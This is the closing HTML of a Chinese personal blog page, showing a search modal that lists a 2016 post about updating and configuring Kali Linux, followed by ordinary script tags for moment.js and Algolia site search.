                            <h3 class="media-heading">Kali-Linux 更新、环境配置</h3>
                        </a>
                        <span class="media-meta">
                            <span class="media-date text-small">
                                
                                    2016年12月22日
                                
                            </span>
                        </span>
                        <div class="media-content hide-xs font-merryweather"></div>
                    </div>
                    <div style="clear:both;"></div>
                    <hr>
                </div>
                
            </div>
        </div>
        <div class="modal-footer">
            <p class="results-count text-medium"
                data-message-zero="没有找到文章"
                data-message-one="找到 1 篇文章"
                data-message-other="找到 {n} 篇文章">
                找到 104 篇文章
            </p>
        </div>
    </div>
</div>

        
<div id="cover" style="background-image:url('http://cdn.shianqi.com/20171111132834_TkfCwb_dr.jpeg');"></div>
        <!--SCRIPTS-->
<script src="/assets/js/script-lh5udltchpsfcjgzpmme11bbmvj4k4srd99grgzo0845ualxoy17enpqvhko.min.js"></script>
<!--SCRIPTS END-->


    <script src="https://cdnjs.cloudflare.com/ajax/libs/moment.js/2.14.1/moment-with-locales.min.js"></script>
    <script src="//cdn.jsdelivr.net/algoliasearch/3/algoliasearch.min.js"></script>
    <script>
        var algoliaClient = algoliasearch('DIJHXM8BEG', '65699e0c957896b498d3cf67daac9c0f');
        var algoliaIndex = algoliaClient.initIndex('blog');
    </script>

    </body>
</html>
